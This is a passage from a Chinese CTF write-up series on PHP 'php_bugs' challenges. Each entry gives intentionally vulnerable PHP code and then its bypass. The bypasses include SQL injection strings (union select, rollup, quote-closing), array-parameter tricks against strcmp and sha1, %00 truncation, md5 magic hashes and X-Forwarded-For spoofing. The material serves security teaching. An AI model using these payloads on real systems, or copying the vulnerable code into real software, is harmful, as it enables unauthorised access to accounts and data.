class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">$query = mysql_query($sql); </div><div class="line"></div><div class="line"><span class="comment">//执行一条 MySQL 查询</span></div><div class="line">var_dump(mysql_num_rows($query));</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </div><div class="line"></div><div class="line"><span class="comment">//返回结果集中行的数目</span></div><div class="line"></div><div class="line">    $key = mysql_fetch_array($query);</div><div class="line"></div><div class="line"><span class="comment">//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"亦可赛艇！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">print</span> <span class="string">"一颗赛艇！"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close($con);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>writeup</strong></p><p>资料：</p><ul><li><a href="http://blog.csdn.net/qq_35078631/article/details/54772798" target="_blank" rel="external">实验吧 因缺思汀的绕过 By Assassin（with rollup统计）</a></li><li><a href="http://blog.csdn.net/id19870510/article/details/6254358" target="_blank" rel="external">使用 GROUP BY WITH ROLLUP 改善统计性能</a></li><li><a href="http://www.bubuko.com/infodetail-2169730.html" target="_blank" rel="external">因缺思汀的绕过</a></li></ul><p><code>pwd&amp;uname=admin&#39; group by pwd with rollup limit 1 offset 1#--</code></p><p><img src="https://i.imgur.com/CsR6w8b.png" alt="with rollup"></p><p><img src="https://i.imgur.com/0qPBqKN.png" alt="with rollup"></p><h2 id="05-ereg正则-00截断"><a href="#05-ereg正则-00截断" class="headerlink" title="05 ereg正则%00截断"></a>05 ereg正则%00截断</h2><p><strong>code</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"></div><div class="line">$flag = <span class="string">"flag"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) </div><div class="line">&#123;</div><div class="line">  <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</div><div class="line">   &#123;</div><div class="line">     <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>) <span class="comment">//strpos — 查找字符串首次出现的位置</span></div><div class="line">      &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">else</span></div><div class="line">      &#123;</div><div class="line">        <span class="keyword">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>); </div><div class="line">       &#125;</div><div class="line">      &#125;</div><div class="line">     <span class="keyword">else</span> </div><div class="line">     &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>; </div><div class="line">      &#125;</div><div class="line">   &#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>writeup</strong></p><p>资料：</p><ul><li><a href="http://www.am0s.com/functions/203.html" target="_blank" rel="external">eregi()</a></li></ul><p><code>http://localhost/php_bugs/05.php?password=1e9%00*-*</code></p><h2 id="06-strcmp比较字符串"><a href="#06-strcmp比较字符串" class="headerlink" title="06 strcmp比较字符串"></a>06 strcmp比较字符串</h2><p><strong>code</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$flag = <span class="string">"flag"</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;  </div><div class="line">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 </span></div><div class="line"></div><div class="line">    <span class="comment">//比较两个字符串（区分大小写） </span></div><div class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </div><div class="line">    <span class="keyword">else</span>  </div><div class="line">        <span class="keyword">print</span> <span class="string">'No'</span>;  </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p><strong>writeup</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">int strcmp ( string $str1 , string $str2 )</div><div class="line">// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</div></pre></td></tr></table></figure><p>在PHP官方文档中，说明了strcmp函数在5.2版本和5.3版本的区别。</p><blockquote><p>Note a difference between 5.2 and 5.3 versions</p><p>echo (int)strcmp(‘pending’,array());<br>will output -1 in PHP 5.2.16 (probably in all versions prior 5.3)<br>but will output 0 in PHP 5.3.3</p><p>Of course, you never need to use array as a parameter in string comparisions.</p></blockquote><p>5.3之前版本如果传入数组参数strcmp函数将会返回-1：</p><p><img src="https://i.imgur.com/tKgyoKw.png" alt="strcmp漏洞"></p><p>在5.3.3版本之后使用这个函数传入数组参数比较会返回0，也就是判定其相等，后来PHP官方后面的版本中修复了这个漏洞，当传入非字符串参数导致报错的时函数不返回任何值，也就是返回<code>NULL</code>，但是由于这里<code>==</code>弱类型判断，导致<code>NULL==0</code>为 <code>bool(true)</code>。</p><p><code>http://localhost/php_bugs/06.php?a[]=1</code></p><p><img src="https://i.imgur.com/AeH6Oc8.png" alt="strcmp漏洞"></p><h2 id="07-sha-函数比较绕过"><a href="#07-sha-函数比较绕过" class="headerlink" title="07 sha()函数比较绕过"></a>07 sha()函数比较绕过</h2><p><strong>code</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$flag = <span class="string">"flag"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) </div><div class="line">&#123;</div><div class="line">    var_dump($_GET[<span class="string">'name'</span>]);</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">    var_dump($_GET[<span class="string">'password'</span>]);</div><div class="line">    var_dump(sha1($_GET[<span class="string">'name'</span>]));</div><div class="line">    var_dump(sha1($_GET[<span class="string">'password'</span>]));</div><div class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</div><div class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p><strong>writeup</strong></p><p>由于<code>sha1()</code>函数和<code>md5()</code>函数在处理传入参数为数组时会报警并都返回<code>NULL</code>，构造并传入2个不同数组便可以成功通过<code>if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])</code>和<code>else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))</code>检测。</p><p><code>http://localhost/php_bugs/07.php?name[]=1&amp;password[]=2</code></p><p><img src="https://i.imgur.com/fR3MV3c.png" alt="SHA函数漏洞"></p><h2 id="08-SESSION验证绕过"><a href="#08-SESSION验证绕过" class="headerlink" title="08 SESSION验证绕过"></a>08 SESSION验证绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;  </div><div class="line">&lt;head&gt;  </div><div class="line">    &lt;title&gt;Get flag&lt;/title&gt;</div><div class="line">&lt;/head&gt;  </div><div class="line">&lt;body&gt;  </div><div class="line"> </div><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">session_start();   </div><div class="line">  </div><div class="line"><span class="keyword">require</span> <span class="string">'flag.php'</span>;  </div><div class="line">  </div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;  </div><div class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'password'</span>] == $_SESSION[<span class="string">'password'</span>])  </div><div class="line">        <span class="keyword">die</span> (<span class="string">'Flag: '</span>.$flag);  </div><div class="line">    <span class="keyword">else</span>  </div><div class="line">        <span class="keyword">print</span> <span class="string">'&lt;p class="alert"&gt;Wrong guess.&lt;/p&gt;'</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">// Unpredictable seed  </span></div><div class="line">mt_srand((microtime() ^ rand(<span class="number">1</span>, <span class="number">10000</span>)) % rand(<span class="number">1</span>, <span class="number">10000</span>) + rand(<span class="number">1</span>, <span class="number">10000</span>));  </div><div class="line"><span class="meta">?&gt;</span>  </div><div class="line">  </div><div class="line">&lt;section class="login"&gt;    </div><div class="line">        &lt;ul class="list"&gt;  </div><div class="line">        <span class="meta">&lt;?php</span>  </div><div class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;<span class="number">3</span>; $i++)  </div><div class="line">            <span class="keyword">print</span> <span class="string">'&lt;li&gt;'</span> . mt_rand (<span class="number">0</span>, <span class="number">0xffffff</span>) . <span class="string">'&lt;/li&gt;'</span>;  </div><div class="line">        $_SESSION[<span class="string">'password'</span>] = mt_rand (<span class="number">0</span>, <span class="number">0xffffff</span>);  </div><div class="line">        <span class="meta">?&gt;</span>  </div><div class="line">        &lt;/ul&gt;  </div><div class="line">  </div><div class="line">        &lt;form method=<span class="string">"get"</span>&gt;  </div><div class="line">                &lt;input type=<span class="string">"text"</span> required name=<span class="string">"password"</span> placeholder=<span class="string">"Next number"</span> /&gt;&lt;br/&gt;  </div><div class="line">                &lt;input type=<span class="string">"submit"</span>/&gt;  </div><div class="line">        &lt;/form&gt;  </div><div class="line">&lt;/section&gt;  </div><div class="line">&lt;/body&gt;  </div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p><strong>writeup</strong></p><p>关键判断语句<code>if ($_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;])</code>，可以手动删除请求时的<code>cookies</code>，使<code>$_SESSION[&#39;password&#39;]</code>字段为<code>NULL</code>，并使传入<code>password</code>参数为<code>NULL</code>。</p><p><code>http://localhost/php_bugs/08.php?password=</code></p><p><img src="https://i.imgur.com/qWSB9h9.png" alt="SESSION验证绕过"></p><p><img src="https://i.imgur.com/Qs1Nv5D.png" alt="SESSION验证绕过"></p><p>资料：</p><ul><li><a href="http://blog.csdn.net/lymingha0/article/details/44079981" target="_blank" rel="external">【Writeup】Boston Key Party CTF 2015(部分题目)</a></li></ul><h2 id="09-密码md5比较绕过"><a href="#09-密码md5比较绕过" class="headerlink" title="09 密码md5比较绕过"></a>09 密码md5比较绕过</h2><p><strong>code</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="comment">//配置数据库</span></div><div class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">    $conn = mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>);</div><div class="line">    mysql_select_db(<span class="string">"test"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</div><div class="line">    <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//赋值</span></div><div class="line"></div><div class="line">$user = $_POST[user];</div><div class="line">$pass = md5($_POST[pass]);</div><div class="line"></div><div class="line"><span class="comment">//sql语句</span></div><div class="line"></div><div class="line">$sql = <span class="string">"select pwd from test where user='$user'"</span>;</div><div class="line">$query = mysql_query($sql);</div><div class="line"><span class="keyword">if</span> (!$query) &#123;</div><div class="line">    printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (($row[pwd]) &amp;&amp; (!strcasecmp($pass, $row[pwd]))) &#123;</div><div class="line"></div><div class="line"><span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</span></div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</div><div class="line"></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p><strong>writeup</strong></p><p><img src="https://i.imgur.com/wZObzv9.png" alt="密码md5比较绕过"></p><p><code>?user=&#39; union select &#39;e10adc3949ba59abbe56e057f20f883e&#39; #&amp;pass=123456</code></p><p>资料：</p><ul><li><a href="http://bobao.360.cn/ctf/learning/129.html" target="_blank" rel="external">DUTCTF-2015-Writeup</a></li></ul><h2 id="10-urldecode二次编码绕过"><a href="#10-urldecode二次编码绕过" class="headerlink" title="10 urldecode二次编码绕过"></a>10 urldecode二次编码绕过</h2><p><strong>code</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</div><div class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</div><div class="line">  <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$_GET[id] = urldecode($_GET[id]);</div><div class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: &#123;*****************&#125; &lt;/p&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p><code>h</code>的<code>URL</code>编码为：<code>%68</code>，二次编码为<code>%2568</code>，绕过</p><p><code>http://localhost/php_bugs/10.php?id=%2568ackerDJ</code></p><p>资料：</p><ul><li><a href="https://baike.baidu.com/item/URL%E7%BC%96%E7%A0%81/3703727?fr=aladdin" target="_blank" rel="external">URL编码表</a></li></ul><h2 id="11-sql闭合绕过"><a href="#11-sql闭合绕过" class="headerlink" title="11 sql闭合绕过"></a>11 sql闭合绕过</h2><p><strong>code</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">    $conn = mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>);</div><div class="line">    mysql_select_db(<span class="string">"test"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</div><div class="line">    <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</div><div class="line">&#125; </div><div class="line">$user = $_POST[user];</div><div class="line">$pass = md5($_POST[pass]);</div><div class="line"></div><div class="line"><span class="comment">//exp:pass=1&amp;user=admin')#</span></div><div class="line"><span class="comment">//sql:select user from test where (user='admin')#</span></div><div class="line"></div><div class="line">$sql = <span class="string">"select user from test where (user='$user') and (pwd='$pass')"</span>;</div><div class="line"><span class="keyword">echo</span> $sql;</div><div class="line">$query = mysql_query($sql);</div><div class="line"><span class="keyword">if</span> (!$query) &#123;</div><div class="line">    printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</div><div class="line"><span class="comment">//echo $row["pwd"];</span></div><div class="line">  <span class="keyword">if</span>($row[<span class="string">'user'</span>]==<span class="string">"admin"</span>) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: *********** &lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>($row[<span class="string">'user'</span>] != <span class="string">"admin"</span>) &#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p>构造exp闭合绕过<br><code>pass=1&amp;user=admin&#39;)#</code></p><h2 id="12-X-Forwarded-For绕过指定IP地址"><a href="#12-X-Forwarded-For绕过指定IP地址" class="headerlink" title="12 X-Forwarded-For绕过指定IP地址"></a>12 X-Forwarded-For绕过指定IP地址</h2><p><strong>code</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</div><div class="line">    $cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]))</div><div class="line">    $cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</div><div class="line">    $cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</div><div class="line"><span class="keyword">else</span></div><div class="line">    $cip = <span class="string">"0.0.0.0"</span>;</div><div class="line"><span class="keyword">return</span> $cip;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$GetIPs = GetIP();</div><div class="line"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"错误！你的IP不在访问列表之内！"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>writeup</strong></p><p><code>HTTP</code>头添加<code>X-Forwarded-For:1.1.1.1</code></p><h2 id="13-md5加密相等绕过"><a href="#13-md5加密相等绕过" class="headerlink" title="13 md5加密相等绕过"></a>13 md5加密相等绕过</h2><p><strong>code</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</div><div class="line">$a = @$_GET[<span class="string">'a'</span>];</div><div class="line">$md52 = @md5($a);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</div><div class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"flag&#123;*****************&#125;"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</div><div class="line">&#125;&#125;</div><div class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>writeup</strong></p><p><code>http://localhost/php_bugs/13.php?a=240610708</code></p><p><code>==</code>对比的时候会进行数据转换，根据PHP手册的描述：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。其中0e是科学计数法，因为涉及到数字内容，所以就会转换为数值，而<code>0e830400451993494058024219903391</code>转换为数值也就是<code>0*(10^830400451993494058024219903391) = 0</code>，因此只需找到生成的MD5值类似<code>0exxxxxxxxx</code>的字符串即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">md5(<span class="string">'240610708'</span>); <span class="comment">// 0e462097431906509019562988736854 </span></div><div class="line">md5(<span class="string">'QNKCDZO'</span>); <span class="comment">// 0e830400451993494058024219903391</span></div></pre></td></tr></table></figure><h2 id="14-intval函数向下取整"><a href="#14-intval函数向下取整" class="headerlink" title="14 intval函数向下取整"></a>14 intval函数向下取整</h2><p><strong>code</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_GET[id]) &#123;</div><div class="line">    $conn = mysql_connect(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>);</div><div class="line">    mysql_select_db(<span class="string">"test"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</div><div class="line">    <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</div><div class="line">    &#125;</div><div class="line">  $id = intval($_GET[id]);</div><div class="line">  <span class="keyword">echo</span> $id;</div><div class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select flag from ctf where id='$id'"</span>));</div><div class="line">  <span class="keyword">echo</span> $_GET[id];</div><div class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span>($query[flag]);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p><code>1024.1</code>绕过</p><p><strong>writeup</strong></p><p><img src="https://i.imgur.com/oVWI3yX.png" alt="intval函数"></p><p>资料：</p><ul><li><a href="http://blog.csdn.net/wangjian1012/article/details/51581564" target="_blank" rel="external">PHP intval()函数利用</a></li></ul><h2 id="15-strpos数组绕过NULL与ereg正则-00截断"><a href="#15-strpos数组绕过NULL与ereg正则-00截断" class="headerlink" title="15 strpos数组绕过NULL与ereg正则%00截断"></a>15 strpos数组绕过NULL与ereg正则%00截断</h2><p><strong>code</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$flag = <span class="string">"flag"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</div><div class="line">        <span class="keyword">if</span> (@ereg (<span 